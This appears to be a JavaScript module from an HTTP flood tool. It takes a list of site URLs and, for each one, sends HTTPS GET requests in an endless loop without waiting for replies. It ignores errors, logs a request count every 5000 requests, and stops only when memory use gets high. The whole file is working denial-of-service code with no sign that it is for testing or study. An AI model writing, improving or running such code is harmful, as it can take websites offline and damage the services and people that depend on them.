const { currentMEMUsege } = require('../helpers/cpu.helper');
const { RequestApi } = require('../utils/api.util');

const NEXT_REQUEST_LOG = 5000;
let canRun = true;

async function start(sites) {
  for (const site of sites) {
    run(site);
  }
}

/**
 *
 * @param {string} site
 */
async function run(site) {
  let requests = 0;
  let nextLogRequestCount = NEXT_REQUEST_LOG;

  site = site.split('/');
  site = site[site.length - 2];

  while (true) {
    new RequestApi()
      .options({
        hostname: site,
        port: 443,
        path: '/',
        method: 'GET',
        timeout: 1000,
      })
      .make()
      .catch((err) => err);

    if (requests === nextLogRequestCount) {
      await checkMEMUsage(site, requests);
      nextLogRequestCount += NEXT_REQUEST_LOG;
    }

    requests++;
  }
}

async function checkMEMUsage(site, requests) {
  const memUsage = currentMEMUsege();

  console.log(
    `Site | ${site} | Requests maked | ${requests} | Free MEM | ${memUsage} | Time | ${new Date().getSeconds()}`
  );

  if (canRun && memUsage > 1500) {
    process.exit(1);
  }
}

module.exports = {
  start,
};
